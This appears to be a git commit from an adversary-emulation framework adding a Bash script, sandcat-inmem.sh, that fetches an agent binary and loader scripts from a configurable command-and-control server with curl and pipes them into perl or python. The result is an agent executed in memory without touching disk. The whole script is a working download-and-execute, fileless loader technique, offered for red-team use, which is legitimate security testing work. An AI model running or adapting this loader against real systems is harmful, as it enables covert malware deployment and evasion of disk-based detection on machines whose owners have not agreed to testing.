a01105a5e9250ca951404fc8ba7a5904c15d10a2
Christopher Tran <christophert@users.noreply.github.com>
2019-12-27 08:59:03 -0500

    VIRTS-588b/Sandcat In-Memory Payload (#199)
    * Add sandcat linux in-memory payload supporting files. Pulled from sandcat/VIRTS-588 main branch
    
    * add sandcat template file with new command

---
+++ payloads/sandcat-inmem.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+set -e
+
+export SC_PROC_NAME=${SC_PROC_NAME:-'sandcat'}
+export SC_DEFAULTSERVER=${SC_DEFAULTSERVER:-'http://localhost:8888'}
+export SC_DEFAULTGROUP=${SC_DEFAULTGROUP:-'my_group'}
+
+declare -a binaries=("python3" "python" "perl")
+
+# used for curl requests that require additional header values
+CURL_CMD=(curl -s -X POST -H "defaultServer:$SC_DEFAULTSERVER" -H "defaultGroup:$SC_DEFAULTGROUP")
+for i in "${binaries[@]}"
+do
+    cmd=$(command -v $i)
+    if [[ -x "$cmd" ]]; then
+        if [[ "$i" == "perl" ]]; then
+            echo "Perl exists, crafting Perl in-memory loader"
+            (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_DEFAULTSERVER/file/download &&
+            ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_DEFAULTSERVER/file/download |
+            perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' &&
+            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_DEFAULTSERVER/file/download; ) | perl
+            break
+        elif [[ "$i" == "python3" ]] || [[ "$i" == "python" ]]; then
+            echo "Python/python3 exists"
+            curl -s -X POST -H 'file:sandcat-elfload.py' $SC_DEFAULTSERVER/file/download | $i
+            break
+        fi
+    else
+        echo "binary doesn't exist"
+    fi
+done
+
+unset SC_PROC_NAME
+unset SC_DEFAULTSERVER
+unset SC_DEFAULTGROUP
